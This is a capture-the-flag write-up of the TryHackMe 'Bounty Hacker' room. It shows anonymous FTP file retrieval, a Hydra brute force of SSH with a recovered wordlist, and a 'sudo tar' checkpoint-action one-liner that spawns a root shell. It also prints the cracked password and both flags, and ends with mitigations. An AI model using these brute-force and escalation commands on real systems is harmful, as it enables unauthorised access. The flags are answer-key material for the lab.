```
 ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗
 ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝
 ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝
 ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝
 ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║
 ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝
 ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗
 ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
 ███████║███████║██║     █████╔╝ █████╗  ██████╔╝
 ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
 ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
 ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
          TryHackMe: Bounty Hacker
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-07 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Easy | ⭐ **Rating:** ⭐⭐☆☆☆

> ⏱️ ~9 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] Port scan: FTP (21), HTTP (80), SSH (22)
- [x] Anonymous FTP login: retrieved `task.txt` (username: `lin`) and `locks.txt` (password wordlist)
- [x] Web directory brute force: nothing actionable
- [x] SSH brute force with Hydra using `locks.txt`
- [x] Authenticated SSH session as `lin`
- [x] Retrieved user flag
- [x] Identified `sudo tar` with no password required
- [x] GTFOBins `tar` checkpoint escape → root shell
- [x] Retrieved root flag

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap: port scanning and service detection
- 📂 FTP client: anonymous login and file retrieval
- 🕷️ Feroxbuster: web directory enumeration
- 🐉 Hydra: SSH brute force
- 🔑 SSH: authenticated user shell

---

## ⚡ TL;DR

Anonymous FTP served up a username (`lin` from `task.txt`) and a custom password wordlist (`locks.txt`). Hydra cracked the SSH password from that list in seconds. Once in as `lin`, a single `sudo tar` GTFOBins one-liner with `--checkpoint-action=exec` spawned a root shell.

---

## 📖 Introduction

Today's target is **Bounty Hacker**: a Cowboy Bebop themed room where you're cast as a hacker trying to impress the crew of the Bebop. Jet wants root. Ed is busy. Faye is unimpressed, as usual. The machine itself is the digital equivalent of leaving your front door open with a note on it saying "username is on the kitchen table." Anonymous FTP, a custom wordlist that might as well be labelled "try these," and a `sudo` rule that grants `tar` to a non-root user. *See you, Space Cowboy.*

### Prerequisites

Readers are assumed to know:

- FTP basics and anonymous login
- What a wordlist is and how Hydra uses one
- How SSH works
- What `sudo -l` reveals and how GTFOBins exploits trusted binaries

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan

*Full port range with RustScan, Nmap for service fingerprinting:*

```bash
rustscan -a 10.49.182.111 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
```

| Port | Service | Version |
| --- | --- | --- |
| 21/tcp | FTP | vsftpd 3.0.5: **anonymous login allowed** |
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80/tcp | HTTP | Apache httpd 2.4.41 (Ubuntu) |

Anonymous FTP flagged by Nmap immediately. This is becoming a pattern: if the scanner hands you an open door, you walk through it first. SSH on standard port 22 this time.

### Anonymous FTP

*The passive mode PASV error appeared immediately: FTP defaulted to active mode cleanly on its own this time:*

```bash
ftp 10.49.182.111
```

```
Name: anonymous
230 Login successful.
ftp> ls
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
```

Two files. Both downloaded immediately.

*Retrieving both files:*

```bash
ftp> get task.txt
ftp> get locks.txt
```

```
# task.txt contents
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

```
# locks.txt contents (excerpt)
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
...
RedDr4gonSynd1cat3
...
```

*(truncated: full wordlist: 26 entries)*

`task.txt` signs off as `lin`: that's the username. `locks.txt` is a 26-entry custom password list. The box is practically writing the Hydra command for us.

### Web Directory Enumeration

*(~5 mins into the box)*

The homepage renders a crew picture and the in-character dialogue: nothing interactive. Feroxbuster ran regardless.

*Directory brute force with PHP, TXT, and HTML extensions:*

```bash
feroxbuster -u http://10.49.182.111 \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,txt,html
```

```
# output (relevant hits only)
200  http://10.49.182.111/index.html
301  http://10.49.182.111/images
301  http://10.49.182.111/javascript
```

Nothing actionable. The web server is set decoration. The real attack surface is FTP and SSH.

---

## 🚪 Foothold

*(~7 mins into the box)*

### SSH Brute Force: Hydra

With username `lin` confirmed from the FTP note and a custom wordlist already in hand, Hydra's job here is almost ceremonial.

*Brute forcing SSH with the recovered wordlist: `-t 4` recommended for SSH to avoid connection throttling:*

```bash
hydra -l lin -P /home/farhan/locks.txt ssh://10.49.182.111
```

```
# output
[22][ssh] host: 10.49.182.111   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed
```

Six seconds. 26 candidates. One hit.

### Credentials Found

| Username | Password | Where Found |
| --- | --- | --- |
| `lin` | `RedDr4gonSynd1cat3` | `task.txt` (username) + `locks.txt` brute force |

---

## 🐚 Shell / Access

*(~8 mins into the box)*

*SSH login as `lin`:*

```bash
ssh lin@10.49.182.111
```

```
# output
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
lin@ip-10-49-182-111:~$
```

*Locating and reading the user flag:*

```bash
find / -name user.txt 2>/dev/null
cat /home/lin/Desktop/user.txt
```

```
THM{CR1M3_SyNd1C4T3}
```

---

## 📈 Escalation

*(~9 mins into the box)*

### sudo tar: GTFOBins

*Checking what `lin` can run as root:*

```bash
sudo -l
```

```
User lin may run the following commands on ip-10-49-182-111:
    (root) /bin/tar
```

**Why is `sudo tar` dangerous?** `tar` is an archiving tool, but it supports a `--checkpoint-action` option designed for running scripts at archive checkpoints. When combined with `--checkpoint=1`, the action fires immediately on the first file. Passing `exec=/bin/sh` as the action tells `tar` to spawn a shell at that checkpoint. Since `tar` is running as root via `sudo`, the spawned shell inherits root privileges. This is a classic GTFOBins escalation: the binary has a legitimate feature that becomes a privilege escalation vector when run with elevated permissions.

*One command to root: archiving `/dev/null` to `/dev/null` as a throwaway operation, firing the checkpoint immediately:*

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

```
# output
tar: Removing leading '/' from member names
# whoami
root
```

*Reading the root flag:*

```bash
cat /root/root.txt
```

```
THM{80UN7Y_h4cK3r}
```

---

## 💥 Exploitation

The complete attack chain:

1. **Anonymous FTP** → `task.txt` revealed username `lin`, `locks.txt` provided a custom password wordlist
2. **Hydra SSH brute force** against the 26-entry wordlist → plaintext password `RedDr4gonSynd1cat3`
3. **SSH login** as `lin` → user flag
4. **`sudo tar` GTFOBins** → root shell in one command → root flag

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `THM{CR1M3_SyNd1C4T3}` | `/home/lin/Desktop/user.txt` |
| Root | `THM{80UN7Y_h4cK3r}` | `/root/root.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| Anonymous FTP serving sensitive files | High | Disable anonymous FTP; never store usernames or password lists on publicly accessible services |
| Weak/guessable password in a short custom wordlist | High | Use long, randomly generated passwords; never maintain a "list of candidate passwords" anywhere on the system |
| `sudo tar` with `NOPASSWD` | Critical | Remove `tar` from `sudoers`; if archiving tasks require elevated access, use `sudoedit` or a dedicated restricted script: consult GTFOBins before adding any binary to `sudoers` |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** GTFOBins is not just a list of fun tricks: it's a mandatory pre-flight checklist before granting `sudo` to any binary. If the tool appears on GTFOBins, granting it unrestricted `sudo` is granting root. `tar`, `vim`, `less`, `awk`, `python`, `perl`, `find`: the list is long and the escalations are trivial.

---

## 🔁 If I Did It Again

Skip Feroxbuster entirely: the homepage had no links, no forms, and no dynamic content. A quick manual check of `robots.txt` and page source would confirm there's nothing there in thirty seconds, saving three minutes of scan time.

---

## 🔚 Changelog

*Last updated: 2026-06-07*

---
